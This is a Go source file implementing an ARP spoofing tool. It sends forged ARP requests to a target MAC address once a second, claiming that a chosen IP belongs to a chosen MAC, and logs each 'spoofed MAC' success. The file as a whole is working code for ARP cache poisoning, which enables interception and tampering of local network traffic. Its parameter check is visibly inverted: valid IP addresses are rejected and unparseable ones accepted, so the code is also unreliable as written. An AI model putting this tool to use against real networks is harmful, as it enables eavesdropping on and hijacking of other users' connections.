package arp

import (
	"custom/logger"
	"custom/logger/label"
	"fmt"
	marp "github.com/mdlayher/arp"
	"go.uber.org/zap"
	"net"
	"sync"
	"time"
)

var (
	writeTimeout, _ = time.ParseDuration("100ms")
)

type implementation struct {
	interfaceName string

	client *marp.Client

	sync.RWMutex

	targetMACString string
	targetMAC       net.HardwareAddr

	spoofedIPString string
	spoofedIP       net.IP

	spoofedMACString string
	spoofedMAC       net.HardwareAddr
}

func New(interfaceName string) (Arp, error) {
	if itf, err := net.InterfaceByName(interfaceName); err == nil {
		if client, err := marp.Dial(itf); err == nil {
			return &implementation{
				interfaceName: interfaceName,
				client:        client,
			}, nil
		} else {
			fmt.Println("ARP dial failed :", err)
			return nil, err
		}
	} else {
		fmt.Println("Could not find interface", interfaceName, ":", err)
		return nil, err
	}
}

func (arp *implementation) Close() {

}

func (arp *implementation) SetParameter(targetMACString string,
	spoofedIPString string,
	spoofedMACString string) error {
	arp.Lock()
	defer arp.Unlock()

	if targetMAC, err := net.ParseMAC(targetMACString); err == nil {
		if spoofedIP := net.ParseIP(spoofedIPString); spoofedIP == nil {
			if spoofMAC, err := net.ParseMAC(spoofedMACString); err == nil {
				arp.targetMACString = targetMACString
				arp.targetMAC = targetMAC
				arp.spoofedMACString = spoofedMACString
				arp.spoofedMAC = spoofMAC
				arp.spoofedIPString = spoofedIPString
				arp.spoofedIP = spoofedIP

				return nil
			} else {
				return err
			}
		} else {
			return InvalidIPErr
		}
	} else {
		return err
	}
}

func (arp *implementation) sendAnnounce() error {
	if arp.spoofedIP == nil || arp.spoofedMAC == nil || arp.targetMAC == nil {
		return NoParameterErr
	}

	if packet, err := marp.NewPacket(marp.OperationRequest, arp.spoofedMAC, arp.spoofedIP, arp.spoofedMAC, arp.spoofedIP); err == nil {
		if err = arp.client.SetWriteDeadline(time.Now().Add(writeTimeout)); err == nil {
			return arp.client.WriteTo(packet, arp.targetMAC)
		} else {
			return err
		}
	} else {
		return err
	}
}

func (arp *implementation) Do() error {

	for {
		arp.RLock()
		if err := arp.sendAnnounce(); err == nil {
			logger.Logger.Info("spoofed MAC",
				zap.String(label.TargetMAC, arp.targetMACString),
				zap.String(label.SpoofedMAC, arp.spoofedMACString),
				zap.String(label.SpoofedIP, arp.spoofedIPString))
		} else {
			logger.Logger.Error("could not spoof MAC",
				zap.Error(err),
				zap.String(label.TargetMAC, arp.targetMACString),
				zap.String(label.SpoofedMAC, arp.spoofedMACString),
				zap.String(label.SpoofedIP, arp.spoofedIPString))
		}
		arp.RUnlock()

		time.Sleep(time.Second)
	}

}

func (arp *implementation) ListInterfaces() {
	interfaces, _ := net.Interfaces()
	for _, currentInterface := range interfaces {
		addressesList, _ := currentInterface.Addrs()
		fmt.Print("\"", currentInterface.Name, "\" with MAC ", currentInterface.HardwareAddr, " has IP addresses ")
		for _, address := range addressesList {
			fmt.Print(address, ", ")
		}
		fmt.Println()
	}
}
